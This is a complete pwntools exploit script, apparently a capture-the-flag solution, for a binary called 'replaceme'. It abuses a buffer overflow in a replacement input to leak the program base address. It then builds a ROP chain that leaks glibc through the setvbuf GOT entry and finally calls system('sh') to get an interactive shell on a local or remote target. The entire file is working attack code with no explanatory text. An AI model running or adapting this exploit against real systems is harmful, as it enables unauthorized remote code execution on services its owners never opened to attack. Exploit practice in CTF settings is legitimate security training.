#!/usr/bin/env python3

from pwn import context, ELF, p8, p32, p64, remote, ROP, sys, u64

context.binary = elf = ELF('replaceme')
glibc = ELF('libc.so.6', checksec=False)


def get_process():
    if len(sys.argv) == 1:
        global glibc
        glibc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
        return elf.process()

    host, port = sys.argv[1].split(':')
    return remote(host, port)


def send_payload(payload: bytes):
    replacement  = b's/B/CCCCC'
    replacement += p32(-1, signed=True)
    replacement += b'D' * 64
    replacement += payload
    replacement += b'/'

    io.sendafter(b'Input: ', b'A' * 127 + b'B')
    io.sendlineafter(b'Replacement: ', replacement)
    io.recvuntil(b'Thank you! Here is the result:\n')
    io.recvuntil(b'D' * 60)


io = get_process()

payload  = p8(elf.sym.main & 0xff)
send_payload(payload)

context.binary.address = u64(io.recv(6) + b'\0\0') - elf.sym.main
io.success(f'ELF address: {hex(context.binary.address)}')

rop = ROP(context.binary)

payload  = p64(rop.rdi.address)
payload += p64(elf.got.setvbuf)
payload += p64(elf.plt.puts)
payload += p64(elf.sym.main)
send_payload(payload)

glibc.address = u64(io.recvline().strip()[-6:] + b'\0\0') - glibc.sym.setvbuf
io.success(f'Glibc base address: {hex(glibc.address)}')

payload  = p64(rop.rdi.address)
payload += p64(next(glibc.search(b'sh\0')))
payload += p64(glibc.sym.system)
send_payload(payload)

io.recv()
io.interactive()